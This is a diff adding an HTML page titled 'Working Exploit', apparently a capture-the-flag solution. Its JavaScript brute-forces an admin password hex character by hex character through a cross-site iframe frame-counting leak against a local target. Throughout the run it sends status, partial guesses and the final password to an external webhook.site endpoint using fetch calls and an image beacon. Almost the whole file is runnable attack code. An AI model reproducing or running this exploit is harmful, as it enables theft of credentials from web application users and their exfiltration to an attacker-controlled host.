@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head><title>Working Exploit</title></head>
+<body>
+<h1>Leaking admin password via iframe frame counting...</h1>
+<pre id="output"></pre>
+<div id="container" style="position:absolute;left:-9999px;top:-9999px;"></div>
+<script>
+const output = document.getElementById('output');
+const container = document.getElementById('container');
+const TARGET = 'https://127.0.0.1:9999/';
+const CHARSET = '0123456789abcdef';
+let knownPassword = 'lebah';
+
+function log(msg) {
+    output.textContent += msg + '\n';
+    console.log(msg);
+}
+
+async function testSubstring(substr) {
+    return new Promise((resolve) => {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = TARGET + '?pass=' + encodeURIComponent(substr);
+        
+        const timeout = setTimeout(() => {
+            if (iframe.parentNode) {
+                container.removeChild(iframe);
+                resolve(false);
+            }
+        }, 2000);
+        
+        iframe.onload = () => {
+            setTimeout(() => {
+                try {
+                    const frameCount = iframe.contentWindow.length;
+                    clearTimeout(timeout);
+                    container.removeChild(iframe);
+                    resolve(frameCount > 0);
+                } catch(e) {
+                    clearTimeout(timeout);
+                    container.removeChild(iframe);
+                    resolve(false);
+                }
+            }, 300);
+        };
+        
+        iframe.onerror = () => {
+            clearTimeout(timeout);
+            if (iframe.parentNode) {
+                container.removeChild(iframe);
+            }
+            resolve(false);
+        };
+        
+        container.appendChild(iframe);
+    });
+}
+
+async function leakPassword() {
+    log('[*] Starting password leak attack...');
+    log('[*] Known prefix: ' + knownPassword);
+    log('[*] Brute-forcing 12 hex characters...\n');
+    
+    // Send initial beacon
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=attack_started').catch(e=>{});
+    
+    for (let i = 0; i < 12; i++) {
+        log(`[*] Position ${i+1}/12...`);
+        let found = false;
+        
+        for (let c of CHARSET) {
+            const candidate = knownPassword + c;
+            log(`  Testing: ${candidate}`);
+            
+            const isMatch = await testSubstring(candidate);
+            
+            if (isMatch) {
+                knownPassword = candidate;
+                log(`  ✓ MATCH! Character '${c}' found`);
+                log(`  Current password: ${knownPassword}\n`);
+                
+                // Send progress update
+                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
+                
+                found = true;
+                break;
+            }
+        }
+        
+        if (!found) {
+            log(`[-] No match found at position ${i+1}!`);
+            break;
+        }
+    }
+    
+    log('\n========================================');
+    log('FINAL ADMIN PASSWORD: ' + knownPassword);
+    log('========================================');
+    
+    // Exfiltrate final result
+    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
+    new Image().src = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?pass=' + encodeURIComponent(knownPassword);
+    
+    log('\n[*] Password exfiltrated to webhook!');
+}
+
+setTimeout(leakPassword, 500);
+</script>
+</body>
+</html>
